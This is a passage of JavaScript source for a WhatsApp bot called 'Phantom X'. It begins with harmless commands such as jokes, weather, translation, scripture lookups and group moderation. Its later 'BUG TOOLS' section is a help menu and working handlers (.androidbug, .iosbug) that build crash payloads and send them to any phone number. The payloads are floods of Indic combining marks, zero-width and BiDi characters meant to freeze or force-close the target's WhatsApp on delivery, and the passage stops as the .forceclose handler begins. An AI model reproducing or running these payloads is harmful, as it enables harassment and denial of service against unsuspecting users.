                const vibes = ["☀️ Immaculate vibes — you're radiating today!", "🔥 On fire! The energy is unmatched.", "💜 Calm, cool, collected. Major main character energy.", "🌊 Chill vibes only. You're in your element.", "😤 Slightly off today but still dangerous.", "🌧️ Cloudy vibes. Take a breather.", "⚡ Electric! People feel your presence.", "🫥 Invisible mode activated. Might be plotting something.", "🤡 Chaotic vibes. Wild but entertaining.", "👑 Royal vibes. No further questions."];
                const vibeMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
                const vibeName = vibeMentioned.length ? `@${vibeMentioned[0].split("@")[0]}` : (parts.slice(1).join(" ").trim() || "you");
                const vibe = vibes[Math.floor(Math.random() * vibes.length)];
                await sock.sendMessage(from, { text: `✨ *VIBE CHECK*\n\n${vibeName}\n\n${vibe}`, mentions: vibeMentioned }, { quoted: msg });
                break;
            }

            // --- JOKE ---
            case ".joke": {
                await reply(`😂 *Random Joke*\n\n${JOKES[Math.floor(Math.random() * JOKES.length)]}`);
                break;
            }

            // --- FACT ---
            case ".fact": {
                await reply(`📚 *Fun Fact*\n\n${FACTS[Math.floor(Math.random() * FACTS.length)]}`);
                break;
            }

            // --- QUOTE ---
            case ".quote": {
                await reply(`✨ *Quote of the Moment*\n\n${QUOTES[Math.floor(Math.random() * QUOTES.length)]}`);
                break;
            }

            // --- ROAST ---
            case ".roast": {
                const roastTarget = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
                const name = roastTarget ? `@${roastTarget.split("@")[0]}` : (parts.slice(1).join(" ").trim() || "you");
                const roast = ROASTS[Math.floor(Math.random() * ROASTS.length)];
                await sock.sendMessage(from, { text: `🔥 *Roast for ${name}:*\n\n${roast}`, mentions: roastTarget ? [roastTarget] : [] }, { quoted: msg });
                break;
            }

            // --- COMPLIMENT ---
            case ".compliment": {
                const compTarget = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
                const cname = compTarget ? `@${compTarget.split("@")[0]}` : (parts.slice(1).join(" ").trim() || "you");
                const comp = COMPLIMENTS[Math.floor(Math.random() * COMPLIMENTS.length)];
                await sock.sendMessage(from, { text: `💛 *Compliment for ${cname}:*\n\n${comp}`, mentions: compTarget ? [compTarget] : [] }, { quoted: msg });
                break;
            }

            // --- TRANSLATE (MyMemory free API) ---
            case ".translate":
            case ".tr": {
                const trParts = parts.slice(1);
                if (trParts.length < 2) return reply("Usage: .translate <lang> <text>\nExample: .translate yoruba Good morning everyone\nLanguage codes: yo (Yoruba), ig (Igbo), ha (Hausa), fr (French), es (Spanish), de (German), zh (Chinese)");
                const toLang = trParts[0];
                const trText = trParts.slice(1).join(" ");
                await reply(`🌐 Translating to *${toLang}*...`);
                try {
                    const encoded = encodeURIComponent(trText);
                    const trResult = await new Promise((resolve, reject) => {
                        https.get(`https://api.mymemory.translated.net/get?q=${encoded}&langpair=en|${toLang}`, (res) => {
                            let data = ""; res.on("data", c => data += c); res.on("end", () => {
                                try { const p = JSON.parse(data); resolve(p.responseData?.translatedText || "No translation"); } catch { reject(new Error("Parse error")); }
                            });
                        }).on("error", reject);
                    });
                    await reply(`🌐 *Translation (${toLang}):*\n\n_${trText}_\n\n➡️ *${trResult}*`);
                } catch (e) { await reply(`❌ Translation failed: ${e?.message}`); }
                break;
            }

            // --- WEATHER (wttr.in free API) ---
            case ".weather":
            case ".wx": {
                const city = parts.slice(1).join(" ").trim();
                if (!city) return reply("Usage: .weather Lagos\nExample: .weather Abuja");
                await reply(`🌤️ Fetching weather for *${city}*...`);
                try {
                    const wxResult = await new Promise((resolve, reject) => {
                        https.get(`https://wttr.in/${encodeURIComponent(city)}?format=4`, (res) => {
                            let data = ""; res.on("data", c => data += c); res.on("end", () => resolve(data.trim()));
                        }).on("error", reject);
                    });
                    await reply(`🌍 *Weather: ${city}*\n\n${wxResult}\n\n_Powered by wttr.in_`);
                } catch (e) { await reply(`❌ Weather fetch failed: ${e?.message}`); }
                break;
            }

            // --- BIBLE (bible-api.com free) ---
            case ".bible": {
                const bRef = parts.slice(1).join(" ").trim();
                const bQuery = bRef || "john 3:16";
                await reply(`📖 Fetching *${bQuery}*...`);
                try {
                    const bVerse = await new Promise((resolve, reject) => {
                        https.get(`https://bible-api.com/${encodeURIComponent(bQuery)}`, (res) => {
                            let data = ""; res.on("data", c => data += c); res.on("end", () => {
                                try { const p = JSON.parse(data); resolve(p.text ? { ref: p.reference, text: p.text.trim() } : null); } catch { reject(new Error("Parse")); }
                            });
                        }).on("error", reject);
                    });
                    if (!bVerse) return reply("❌ Verse not found. Example: .bible John 3:16");
                    await reply(`📖 *${bVerse.ref}*\n\n_"${bVerse.text}"_\n\n_— Holy Bible (KJV)_`);
                } catch (e) { await reply(`❌ Bible fetch failed: ${e?.message}`); }
                break;
            }

            // --- QURAN (alquran.cloud free API) ---
            case ".quran": {
                const qInput = parts.slice(1).join(":").trim();
                const [surahStr, ayahStr] = qInput.split(":").map(s => s?.trim());
                const surah = parseInt(surahStr) || 1;
                const ayah = parseInt(ayahStr) || 1;
                await reply(`📗 Fetching Surah *${surah}*, Ayah *${ayah}*...`);
                try {
                    const [arResult, enResult] = await Promise.all([
                        new Promise((resolve, reject) => {
                            https.get(`https://api.alquran.cloud/v1/ayah/${surah}:${ayah}`, (res) => {
                                let data = ""; res.on("data", c => data += c); res.on("end", () => {
                                    try { const p = JSON.parse(data); resolve(p.data || null); } catch { reject(new Error("Parse")); }
                                });
                            }).on("error", reject);
                        }),
                        new Promise((resolve, reject) => {
                            https.get(`https://api.alquran.cloud/v1/ayah/${surah}:${ayah}/en.asad`, (res) => {
                                let data = ""; res.on("data", c => data += c); res.on("end", () => {
                                    try { const p = JSON.parse(data); resolve(p.data || null); } catch { reject(new Error("Parse")); }
                                });
                            }).on("error", reject);
                        }),
                    ]);
                    if (!arResult) return reply("❌ Ayah not found. Example: .quran 2:255");
                    const surahName = arResult.surah?.englishName || `Surah ${surah}`;
                    await reply(`📗 *${surahName} — Ayah ${ayah}*\n\n*Arabic:*\n${arResult.text}\n\n*English:*\n_"${enResult?.text || "Translation unavailable."}"_`);
                } catch (e) { await reply(`❌ Quran fetch failed: ${e?.message}`); }
                break;
            }

            // --- GROUP INFO ---
            case ".groupinfo": {
                if (!isGroup) return reply("❌ This command only works in groups.");
                try {
                    const meta = await sock.groupMetadata(from);
                    const admins = meta.participants.filter(p => p.admin);
                    const created = new Date(meta.creation * 1000).toLocaleDateString("en-NG");
                    await reply(
                        `👥 *GROUP INFO*\n━━━━━━━━━━━━━━━━━━━\n\n` +
                        `📌 *Name:* ${meta.subject}\n` +
                        `🆔 *ID:* ${from}\n` +
                        `👤 *Members:* ${meta.participants.length}\n` +
                        `🛡️ *Admins:* ${admins.length}\n` +
                        `📅 *Created:* ${created}\n` +
                        `📝 *Description:*\n_${meta.desc || "No description"}_`
                    );
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // --- ADMIN LIST ---
            case ".adminlist": {
                if (!isGroup) return reply("❌ This command only works in groups.");
                try {
                    const meta = await sock.groupMetadata(from);
                    const admins = meta.participants.filter(p => p.admin);
                    if (!admins.length) return reply("No admins found.");
                    let txt = `🛡️ *Admin List — ${meta.subject}*\n━━━━━━━━━━━━━━━━━━━\n\n`;
                    admins.forEach((a, i) => { txt += `${i+1}. @${a.id.split("@")[0]} ${a.admin === "superadmin" ? "👑" : "🛡️"}\n`; });
                    await sock.sendMessage(from, { text: txt, mentions: admins.map(a => a.id) }, { quoted: msg });
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // --- MEMBER COUNT ---
            case ".membercount": {
                if (!isGroup) return reply("❌ This command only works in groups.");
                try {
                    const meta = await sock.groupMetadata(from);
                    await reply(`👥 *Member Count:* *${meta.participants.length}* members in *${meta.subject}*`);
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // --- EVERYONE (tag all members) ---
            case ".everyone":
            case ".all": {
                if (!isGroup) return reply("❌ This command only works in groups.");
                const evMsg = parts.slice(1).join(" ").trim() || "📢 *Attention everyone!*";
                try {
                    const meta = await sock.groupMetadata(from);
                    const members = meta.participants.map(p => p.id);
                    const mentionText = members.map(j => `@${j.split("@")[0]}`).join(" ");
                    await sock.sendMessage(from, { text: `${evMsg}\n\n${mentionText}`, mentions: members }, { quoted: msg });
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // --- SET STATUS (WhatsApp about) ---
            case ".setstatus": {
                if (!msg.key.fromMe) return reply("❌ Only the bot owner can use this.");
                const statusText = parts.slice(1).join(" ").trim();
                if (!statusText) return reply("Usage: .setstatus <your new status>");
                try {
                    await sock.updateProfileStatus(statusText);
                    await reply(`✅ Status updated to:\n_${statusText}_`);
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // --- SET NAME (WhatsApp display name) ---
            case ".setname": {
                if (!msg.key.fromMe) return reply("❌ Only the bot owner can use this.");
                const newName = parts.slice(1).join(" ").trim();
                if (!newName) return reply("Usage: .setname <new name>");
                try {
                    await sock.updateProfileName(newName);
                    await reply(`✅ Display name updated to: *${newName}*`);
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // --- WARN ---
            case ".warn": {
                if (!isGroup) return reply("❌ Only works in groups.");
                if (!msg.key.fromMe) return reply("❌ Only the bot owner can warn members.");
                const warnTarget = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
                if (!warnTarget) return reply("Usage: .warn @user — Reply or tag someone.");
                const wCount = addWarn(from, warnTarget);
                if (wCount >= 3) {
                    resetWarns(from, warnTarget);
                    try { await sock.groupParticipantsUpdate(from, [warnTarget], "remove"); } catch (_) {}
                    await sock.sendMessage(from, { text: `🚫 @${warnTarget.split("@")[0]} has been *kicked* — 3 warnings reached!`, mentions: [warnTarget] }, { quoted: msg });
                } else {
                    await sock.sendMessage(from, { text: `⚠️ @${warnTarget.split("@")[0]} has been warned!\n\n⚠️ Warning *${wCount}/3* — 3 = kick.`, mentions: [warnTarget] }, { quoted: msg });
                }
                break;
            }

            // --- WARNLIST ---
            case ".warnlist": {
                if (!isGroup) return reply("❌ Only works in groups.");
                const warnData = getAllWarns(from);
                const entries = Object.entries(warnData).filter(([, v]) => v > 0);
                if (!entries.length) return reply("✅ No active warnings in this group.");
                let wTxt = `⚠️ *Warning List*\n━━━━━━━━━━━━━━━━━━━\n\n`;
                entries.forEach(([jid, count]) => { wTxt += `• @${jid.split("@")[0]}: *${count}/3* warns\n`; });
                await sock.sendMessage(from, { text: wTxt, mentions: entries.map(([j]) => j) }, { quoted: msg });
                break;
            }

            // --- RESETWARN ---
            case ".resetwarn": {
                if (!isGroup) return reply("❌ Only works in groups.");
                if (!msg.key.fromMe) return reply("❌ Only the bot owner can reset warnings.");
                const rwTarget = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
                if (!rwTarget) return reply("Usage: .resetwarn @user");
                resetWarns(from, rwTarget);
                await sock.sendMessage(from, { text: `✅ Warnings cleared for @${rwTarget.split("@")[0]}!`, mentions: [rwTarget] }, { quoted: msg });
                break;
            }

            // --- BAN ---
            case ".ban": {
                if (!msg.key.fromMe) return reply("❌ Only the bot owner can ban users.");
                const banTarget = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
                if (!banTarget) return reply("Usage: .ban @user — Tag the person to ban from the bot.");
                if (botJid) addBan(botJid, banTarget);
                await sock.sendMessage(from, { text: `🔴 @${banTarget.split("@")[0]} has been *banned* from using this bot.`, mentions: [banTarget] }, { quoted: msg });
                break;
            }

            // --- UNBAN ---
            case ".unban": {
                if (!msg.key.fromMe) return reply("❌ Only the bot owner can unban users.");
                const unbanTarget = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
                if (!unbanTarget) return reply("Usage: .unban @user");
                if (botJid) removeBan(botJid, unbanTarget);
                await sock.sendMessage(from, { text: `🟢 @${unbanTarget.split("@")[0]} has been *unbanned*.`, mentions: [unbanTarget] }, { quoted: msg });
                break;
            }

            // --- ANTIDELETE ---
            case ".antidelete": {
                if (!isGroup) return reply("❌ Only works in groups.");
                if (!msg.key.fromMe) return reply("❌ Owner only.");
                const adSub = parts[1]?.toLowerCase();
                if (adSub === "on") { setGroupSetting(from, "antidelete", true); return reply("✅ Anti-delete *ON* — Deleted messages will be re-sent."); }
                if (adSub === "off") { setGroupSetting(from, "antidelete", false); return reply("✅ Anti-delete *OFF*."); }
                return reply(`Usage: .antidelete on/off\nCurrent: *${getGroupSetting(from, "antidelete") ? "ON" : "OFF"}*`);
            }

            // --- ANTIBOT ---
            case ".antibot": {
                if (!isGroup) return reply("❌ Only works in groups.");
                if (!msg.key.fromMe) return reply("❌ Owner only.");
                const abSub = parts[1]?.toLowerCase();
                if (abSub === "on") { setGroupSetting(from, "antibot", true); return reply("✅ Anti-bot *ON* — Bot accounts will be auto-kicked."); }
                if (abSub === "off") { setGroupSetting(from, "antibot", false); return reply("✅ Anti-bot *OFF*."); }
                return reply(`Usage: .antibot on/off\nCurrent: *${getGroupSetting(from, "antibot") ? "ON" : "OFF"}*`);
            }

            // --- SCHEDULE ---
            case ".schedule": {
                if (!isGroup) return reply("❌ Only works in groups.");
                if (!msg.key.fromMe) return reply("❌ Owner only.");
                const schedTime = parts[1];
                const schedMsg = parts.slice(2).join(" ").trim();
                if (!schedTime || !schedMsg || !/^\d{2}:\d{2}$/.test(schedTime)) return reply("Usage: .schedule HH:MM <message>\nExample: .schedule 08:00 Good morning everyone!");
                const schedData = loadSchedules();
                if (!schedData[from]) schedData[from] = [];
                const exists = schedData[from].find(s => s.time === schedTime);
                if (exists) { exists.message = schedMsg; } else { schedData[from].push({ time: schedTime, message: schedMsg }); }
                saveSchedules(schedData);
                await reply(`✅ Scheduled *${schedTime}* daily:\n_"${schedMsg}"_`);
                break;
            }

            case ".unschedule": {
                if (!isGroup) return reply("❌ Only works in groups.");
                if (!msg.key.fromMe) return reply("❌ Owner only.");
                const uTime = parts[1];
                if (!uTime) return reply("Usage: .unschedule HH:MM");
                const ud = loadSchedules();
                if (ud[from]) { ud[from] = ud[from].filter(s => s.time !== uTime); saveSchedules(ud); }
                await reply(`✅ Schedule at *${uTime}* removed.`);
                break;
            }

            case ".schedules": {
                if (!isGroup) return reply("❌ Only works in groups.");
                const sd = loadSchedules();
                const entries = sd[from] || [];
                if (!entries.length) return reply("📅 No active schedules for this group.");
                let sTxt = "📅 *Active Schedules*\n━━━━━━━━━━━━━━━━━━━\n\n";
                entries.forEach(s => { sTxt += `⏰ *${s.time}* — _"${s.message}"_\n`; });
                await reply(sTxt);
                break;
            }

            // ════════════════════════════════════════
            // ░░░░░ BUG TOOLS ░░░░░
            // ════════════════════════════════════════

            case ".bugmenu": {
                const section = parts[1]?.toLowerCase();

                // ── Android section ──
                const androidHelp =
                    `🤖━━━━━━━━━━━━━━━━━━━━━━━━━━🤖\n` +
                    `   📱 *ANDROID BUGS — Phantom X*\n` +
                    `🤖━━━━━━━━━━━━━━━━━━━━━━━━━━🤖\n\n` +
                    `⚠️ *Works on Android WhatsApp only*\n\n` +
                    `📌 *Usage:* *.androidbug <number>*\n` +
                    `   Example: *.androidbug 2348012345678*\n\n` +
                    `💥 *How it works:*\n` +
                    `   Sends a payload of Telugu/Kannada/Tamil\n` +
                    `   combining characters that overload the\n` +
                    `   Android text renderer — WhatsApp freezes\n` +
                    `   or force-closes *immediately when the\n` +
                    `   message arrives*, even without opening it.\n\n` +
                    `🔧 *Undo:* *.unbug <number>*\n\n` +
                    `🛡️ _Dev number is permanently protected._`;

                // ── iOS section ──
                const iosHelp =
                    `🍎━━━━━━━━━━━━━━━━━━━━━━━━━━🍎\n` +
                    `   📱 *iOS BUGS — Phantom X*\n` +
                    `🍎━━━━━━━━━━━━━━━━━━━━━━━━━━🍎\n\n` +
                    `⚠️ *Works on iPhone WhatsApp only*\n\n` +
                    `📌 *Usage:* *.iosbug <number>*\n` +
                    `   Example: *.iosbug 2348012345678*\n\n` +
                    `💥 *How it works:*\n` +
                    `   Sends a Sindhi/Arabic Unicode + BiDi\n` +
                    `   override payload that triggers an iOS\n` +
                    `   text layout engine crash — WhatsApp\n` +
                    `   closes *as soon as the notification is\n` +
                    `   processed* or the chat is opened.\n\n` +
                    `🔧 *Undo:* *.unbug <number>*\n\n` +
                    `🛡️ _Dev number is permanently protected._`;

                // ── Freeze/Force-close section ──
                const freezeHelp =
                    `💀━━━━━━━━━━━━━━━━━━━━━━━━━━💀\n` +
                    `   ❄️ *FREEZE & FORCE CLOSE — Phantom X*\n` +
                    `💀━━━━━━━━━━━━━━━━━━━━━━━━━━💀\n\n` +
                    `⚠️ *Works on ALL devices (Android + iOS)*\n\n` +
                    `💀 *.forceclose <number>*\n` +
                    `   Strongest bug. ZWJ chain + RTL stack +\n` +
                    `   Arabic isolation overload. Forces WA to\n` +
                    `   fully close *immediately on message delivery*.\n` +
                    `   Undo: *.unbug <number>*\n\n` +
                    `🧊 *.freeze <number>*\n` +
                    `   Zero-width character flood. Freezes the\n` +
                    `   target's chat — can't scroll or type.\n` +
                    `   Undo: *.unbug <number>*\n\n` +
                    `👁️ *.invisfreeze <number>*\n` +
                    `   Sends an *invisible* message (no text visible).\n` +
                    `   Target doesn't see anything arrive, but WA\n` +
                    `   silently processes thousands of hidden chars,\n` +
                    `   causing freeze/lag. Hardest to detect.\n` +
                    `   Undo: *.unbug <number>*\n\n` +
                    `🛡️ _Dev number is permanently protected._`;

                // ── Group section ──
                const groupHelp =
                    `🏘️━━━━━━━━━━━━━━━━━━━━━━━━━━🏘️\n` +
                    `   💣 *GROUP BUGS — Phantom X*\n` +
                    `🏘️━━━━━━━━━━━━━━━━━━━━━━━━━━🏘️\n\n` +
                    `⚠️ *Affects everyone who opens the group*\n\n` +
                    `💣 *.groupcrash*\n` +
                    `   Run inside the target group.\n` +
                    `   Anyone who taps/opens that group → WA crashes.\n` +
                    `   Swipe away = WA returns. Open again = crash. ♻️\n` +
                    `   Only the group is affected — not their WA elsewhere.\n\n` +
                    `💣 *.groupcrash <invite link>*\n` +
                    `   Example: *.groupcrash https://chat.whatsapp.com/XYZ*\n\n` +
                    `💣 *.groupcrash <groupId>*\n` +
                    `   Example: *.groupcrash 120363XXXXXX@g.us*\n` +
                    `   _(get ID from *.groupid* inside the group)_\n\n` +
                    `🔧 *.ungroupcrash <groupId>*\n` +
                    `   Removes the crash — group returns to normal.\n\n` +
                    `🛡️ _Dev's groups are not protected — use responsibly._`;

                // ── Full menu ──
                const bugMenu =
                    `💥━━━━━━━━━━━━━━━━━━━━━━━━━━💥\n` +
                    `   ☠️  *P H A N T O M  X*  ☠️\n` +
                    `      _B U G  A R S E N A L_\n` +
                    `💥━━━━━━━━━━━━━━━━━━━━━━━━━━💥\n\n` +
                    `⚠️ _OWNER ONLY — Dev number is protected_ ⚠️\n` +
                    `📌 _All bugs use phone number, not @tag_\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `🤖 *ANDROID BUGS*\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `  *.androidbug <number>* — Overloads Android renderer\n` +
                    `  _Triggers even from notification, no interaction needed_\n` +
                    `  🔧 Undo: *.unbug <number>*\n` +
                    `  ℹ️ Help: *.bugmenu android*\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `🍎 *iOS BUGS*\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `  *.iosbug <number>* — Sindhi/Arabic crash for iPhone\n` +
                    `  _Triggers on notification processing or chat open_\n` +
                    `  🔧 Undo: *.unbug <number>*\n` +
                    `  ℹ️ Help: *.bugmenu ios*\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `💀 *FORCE CLOSE & FREEZE* (any device)\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `  *.forceclose <number>* — Strongest. Forces WA to close\n` +
                    `  *.freeze <number>* — Freezes their chat completely\n` +
                    `  *.invisfreeze <number>* — Silent invisible overload\n` +
                    `  🔧 Undo all: *.unbug <number>*\n` +
                    `  ℹ️ Help: *.bugmenu freeze*\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `🏘️ *GROUP BUGS*\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `  *.groupcrash* — Loop crash (run inside group)\n` +
                    `  *.groupcrash <link/groupId>* — Target from outside\n` +
                    `  🔧 Undo: *.ungroupcrash <groupId>*\n` +
                    `  ℹ️ Help: *.bugmenu group*\n\n` +
                    `💥━━━━━━━━━━━━━━━━━━━━━━━━━━💥\n` +
                    `  ☠️ _Phantom X — Bug Division Active_ 💀\n` +
                    `💥━━━━━━━━━━━━━━━━━━━━━━━━━━💥`;

                if (section === "android") return reply(androidHelp);
                if (section === "ios") return reply(iosHelp);
                if (section === "freeze" || section === "forceclose") return reply(freezeHelp);
                if (section === "group") return reply(groupHelp);
                await reply(bugMenu);
                break;
            }

            case ".zalgo": {
                const zalgoInput = parts.slice(1).join(" ").trim();
                if (!zalgoInput) return reply("Usage: .zalgo <text>\nExample: .zalgo Phantom X");
                const zalgoUp = ["\u030d","\u030e","\u0304","\u0305","\u033f","\u0311","\u0306","\u0310","\u0352","\u0357","\u0351","\u0307","\u0308","\u030a","\u0342","\u0343","\u0344","\u034a","\u034b","\u034c","\u0303","\u0302","\u030c","\u0350","\u0300","\u0301","\u030b","\u030f","\u0312","\u0313","\u0314","\u033d","\u0309","\u0363","\u0364","\u0365","\u0366","\u0367","\u0368","\u0369","\u036a","\u036b","\u036c","\u036d","\u036e","\u036f","\u033e","\u035b"];
                const zalgoMid = ["\u0315","\u031b","\u0340","\u0341","\u0358","\u0321","\u0322","\u0327","\u0328","\u0334","\u0335","\u0336","\u034f","\u035c","\u035d","\u035e","\u035f","\u0360","\u0362","\u0338","\u0337","\u0361","\u0489"];
                const zalgoDown = ["\u0316","\u0317","\u0318","\u0319","\u031c","\u031d","\u031e","\u031f","\u0320","\u0324","\u0325","\u0326","\u0329","\u032a","\u032b","\u032c","\u032d","\u032e","\u032f","\u0330","\u0331","\u0332","\u0333","\u0339","\u033a","\u033b","\u033c","\u0345","\u0347","\u0348","\u0349","\u034d","\u034e","\u0353","\u0354","\u0355","\u0356","\u0359","\u035a","\u0323"];
                const randArr = arr => arr[Math.floor(Math.random() * arr.length)];
                let zalgoOut = "";
                for (const ch of zalgoInput) {
                    zalgoOut += ch;
                    const upCount = Math.floor(Math.random() * 6) + 2;
                    const midCount = Math.floor(Math.random() * 3);
                    const downCount = Math.floor(Math.random() * 6) + 2;
                    for (let i = 0; i < upCount; i++) zalgoOut += randArr(zalgoUp);
                    for (let i = 0; i < midCount; i++) zalgoOut += randArr(zalgoMid);
                    for (let i = 0; i < downCount; i++) zalgoOut += randArr(zalgoDown);
                }
                await reply(`👹 *Z̷̢̛̪A̶̗͠L̵͖̒G̸͎̔O̴͕̊ T̵̤̀E̸͎̾X̵̯̾T̶̢̕*\n\n${zalgoOut}`);
                break;
            }

            case ".bigtext": {
                const bigtextInput = parts.slice(1).join(" ").trim();
                if (!bigtextInput) return reply("Usage: .bigtext <text>\nExample: .bigtext PHANTOM");
                const blockMap = {
                    a:"🅰",b:"🅱",c:"🅲",d:"🅳",e:"🅴",f:"🅵",g:"🅶",h:"🅷",i:"🅸",j:"🅹",
                    k:"🅺",l:"🅻",m:"🅼",n:"🅽",o:"🅾",p:"🅿",q:"🆀",r:"🆁",s:"🆂",t:"🆃",
                    u:"🆄",v:"🆅",w:"🆆",x:"🆇",y:"🆈",z:"🆉"," ":"   ",
                    "0":"0️⃣","1":"1️⃣","2":"2️⃣","3":"3️⃣","4":"4️⃣",
                    "5":"5️⃣","6":"6️⃣","7":"7️⃣","8":"8️⃣","9":"9️⃣",
                };
                const bigOut = bigtextInput.toLowerCase().split("").map(c => blockMap[c] || c).join(" ");
                await reply(`📐 *Big Text:*\n\n${bigOut}`);
                break;
            }

            case ".invisible": {
                if (!msg.key.fromMe) return reply("❌ Owner only.");
                const invChar = "\u2062\u2063\u2064\u200b\u200c\u200d\u00ad";
                await sock.sendMessage(from, { text: invChar.repeat(50) });
                break;
            }

            case ".rtl": {
                const rtlInput = parts.slice(1).join(" ").trim();
                if (!rtlInput) return reply("Usage: .rtl <text>\nExample: .rtl Hello World");
                const rtlOut = "\u202e" + rtlInput;
                await reply(`➡️ *RTL Text:*\n\n${rtlOut}`);
                break;
            }

            case ".mock": {
                const mockInput = parts.slice(1).join(" ").trim();
                if (!mockInput) return reply("Usage: .mock <text>\nExample: .mock I am the best");
                let mockOut = "";
                let toggle = false;
                for (const ch of mockInput) {
                    if (ch === " ") { mockOut += " "; continue; }
                    mockOut += toggle ? ch.toUpperCase() : ch.toLowerCase();
                    toggle = !toggle;
                }
                await reply(`🧽 ${mockOut}`);
                break;
            }

            case ".aesthetic": {
                const aesInput = parts.slice(1).join(" ").trim();
                if (!aesInput) return reply("Usage: .aesthetic <text>\nExample: .aesthetic phantom x");
                const aesMap = "abcdefghijklmnopqrstuvwxyz0123456789";
                const aesOut_chars = "ａｂｃｄｅｆｇｈｉｊｋｌｍｎｏｐｑｒｓｔｕｖｗｘｙｚ０１２３４５６７８９";
                let aesOut = "";
                for (const ch of aesInput.toLowerCase()) {
                    const idx = aesMap.indexOf(ch);
                    aesOut += idx !== -1 ? [...aesOut_chars][idx] : ch === " " ? "　" : ch;
                }
                await reply(`🌸 ${aesOut}`);
                break;
            }

            case ".reverse": {
                const revInput = parts.slice(1).join(" ").trim();
                if (!revInput) return reply("Usage: .reverse <text>\nExample: .reverse Hello World");
                const revOut = [...revInput].reverse().join("");
                await reply(`🔁 *Reversed:*\n\n${revOut}`);
                break;
            }

            case ".clap": {
                const clapInput = parts.slice(1).join(" ").trim();
                if (!clapInput) return reply("Usage: .clap <text>\nExample: .clap this is the best bot");
                const clapOut = clapInput.split(" ").join(" 👏 ");
                await reply(`👏 ${clapOut} 👏`);
                break;
            }

            // ─── ANDROID BUG ───
            // Telugu/Kannada/Tamil combining marks overload the Android WA text renderer.
            // Triggers immediately on notification — no interaction needed from target.
            case ".androidbug": {
                if (!msg.key.fromMe) return reply("❌ Owner only.");
                const andTarget = parseBugTarget(parts, msg);
                if (!andTarget) return reply(`🤖 *Android Bug*\n\nUsage: *.androidbug <number>*\nExample: *.androidbug 2348012345678*\n\n_Overloads Android WhatsApp text renderer._\n_Use .bugmenu android for full help._`);
                if (isDevProtected(andTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number (${andTarget.split("@")[0]}) belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
                await reply(`🤖 Sending Android bug to *${andTarget.split("@")[0]}*...`);
                try {
                    const tel = "\u0C15\u0C4D\u0C37\u0C4D\u0C30".repeat(500);
                    const kan = "\u0CB5\u0CBF\u0CCD\u0CB6\u0CCD\u0CB5".repeat(400);
                    const tam = "\u0BA4\u0BBF\u0B99\u0BCD\u0B95\u0BCD".repeat(400);
                    const zwj  = "\u200D\u200C\u200B".repeat(800);
                    const androidPayload = tel + zwj + kan + zwj + tam + zwj + "\uD83D\uDCA5".repeat(300);
                    const andSent = await sock.sendMessage(andTarget, { text: androidPayload });
                    if (!userCrashKeys[andTarget]) userCrashKeys[andTarget] = [];
                    userCrashKeys[andTarget].push(andSent.key);
                    await reply(`✅ *Android bug sent to ${andTarget.split("@")[0]}!*\n\n🤖 Overloading their Android renderer now.\n🔧 To undo: *.unbug ${andTarget.split("@")[0]}*`);
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // ─── iOS BUG ───
            // Sindhi + Arabic + BiDi overrides crash the iOS WhatsApp text engine.
            // Triggers on notification processing — no need for target to open chat.
            case ".iosbug": {
                if (!msg.key.fromMe) return reply("❌ Owner only.");
                const iosTarget = parseBugTarget(parts, msg);
                if (!iosTarget) return reply(`🍎 *iOS Bug*\n\nUsage: *.iosbug <number>*\nExample: *.iosbug 2348012345678*\n\n_Crashes iPhone WhatsApp on notification._\n_Use .bugmenu ios for full help._`);
                if (isDevProtected(iosTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
                await reply(`🍎 Sending iOS bug to *${iosTarget.split("@")[0]}*...`);
                try {
                    const sindhi  = "\u0600\u0601\u0602\u0603\u0604\u0605".repeat(600);
                    const arabPF  = "\uFDFD\uFDFC\uFDFB".repeat(400);
                    const bidi    = "\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069".repeat(500);
                    const feff    = "\uFEFF".repeat(600);
                    const iosPayload = sindhi + arabPF + bidi + feff;
                    const iosSent = await sock.sendMessage(iosTarget, { text: iosPayload });
                    if (!userCrashKeys[iosTarget]) userCrashKeys[iosTarget] = [];
                    userCrashKeys[iosTarget].push(iosSent.key);
                    await reply(`✅ *iOS bug sent to ${iosTarget.split("@")[0]}!*\n\n🍎 iOS WhatsApp crash payload delivered.\n🔧 To undo: *.unbug ${iosTarget.split("@")[0]}*`);
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // ─── FORCE CLOSE BUG ───
            // Strongest bug. ZWJ chain + RTL stack + Arabic isolation = WA force-closes.
            // Fires immediately on message delivery — no interaction required from target.
            case ".forceclose":
            case ".fc": {
                if (!msg.key.fromMe) return reply("❌ Owner only.");
                const fcTarget = parseBugTarget(parts, msg);
